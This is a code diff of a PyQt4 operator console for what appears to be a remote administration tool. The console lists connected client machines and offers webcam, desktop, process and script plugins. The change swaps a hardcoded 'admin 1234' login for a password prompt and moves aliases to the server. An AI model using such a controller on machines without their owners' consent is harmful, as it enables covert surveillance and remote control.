@@ -20,7 +20,6 @@ from PyQt4.QtCore import *
 from libs import pygeoip
 from libs.language import Translate
 from ui import gui
-from libs.alias import Alias
 from libs.settings import Config, Settings
 from libs.builder import Builder
 from libs.modechat import get, send
@@ -32,7 +31,6 @@ from plugins.mprocesses import main as mprocesses
 from plugins.mscript import main as mscript
 from plugins.mdesktop import main as mdesktop
 from plugins.mwebcam import main as mwebcam
-
 
 # initial geo ip database
 geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')
@@ -82,9 +80,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
         # unlocked servers bank
         self.unlockedSockets = []
-
-        # initial alias
-        self.alias = Alias()
 
         # listen status
         self.acceptthreadState = False
@@ -235,12 +230,18 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         try:
             session_id = id_generator(size=24)
             self.connection_socket.connect((self.IPADDRESS, self.PORT))
-            auth_status = get(self.connection_socket, 'auth admin 1234', session_id)
-            if auth_status == 'LoginSuccess':
-                self.servers_checker_thread = threading.Thread(target=self.check_servers, args=(session_id,))
-                self.servers_checker_thread.start()
-            elif auth_status == 'LoginError':
-                return
+            while 1:
+                text, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD') + self.USERNAME, QLineEdit.Password)
+                if ok:
+                    auth_status = get(self.connection_socket, 'auth %s %s' % (self.USERNAME, str(text)), session_id)
+                    if auth_status == 'LoginSuccess':
+                        self.servers_checker_thread = threading.Thread(target=self.check_servers, args=(session_id,))
+                        self.servers_checker_thread.start()
+                        return
+                    elif auth_status == 'LoginError':
+                        continue
+                else:
+                    return
         except socket.error:
             return
 
@@ -329,8 +330,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 item.setIcon(QIcon(get_ip_location(ip_address)))
                 self.serversTable.setItem(index, self.index_of_ipAddress, item)
 
-                # add alias if aviable
-                alias = self.alias.get_alias(online_clients[obj]['ip_address'], online_clients[obj]['os'])
+                # add alias if avaiable
+                alias = online_clients[obj]['alias']
                 item = QTableWidgetItem(alias)
                 self.serversTable.setItem(index, self.index_of_alias, item)
 
@@ -407,7 +408,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             pass
 
         self.offlineServersTable.setRowCount(len(offline_clients))
-        print offline_clients
         try:
             for index, obj in enumerate(offline_clients):
 
@@ -432,8 +432,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
         # update servers online counter
         self.onlineStatus.setText(str(len(online_clients)))
-
-
 
     def unlock_client(self):
         while 1:
@@ -623,7 +621,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if client:
             text, ok = QInputDialog.getText(self, _('ALIAS_SET'), _('ALIAS_NAME'))
             if ok:
-                self.alias.set_alias(self.streaming_socks[client]['ip_address'], self.streaming_socks[client]['os'], text)
+                get(self.connection_socket, 'setAlias ' + str(text), self.streaming_socks[client]['id'])
 
     def run_as_admin(self):
         client = self.current_client()
@@ -648,8 +646,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.settings = Config()
         self.IPADDRESS = self.settings.ip_address
         self.PORT = self.settings.port
-        self.MAXCONNECTIONS = self.settings.max_connections
-        self.TIMEOUT = self.settings.timeout
+        self.USERNAME = self.settings.username
         self.LANGUAGE = self.settings.language
 
     def run_settings(self):
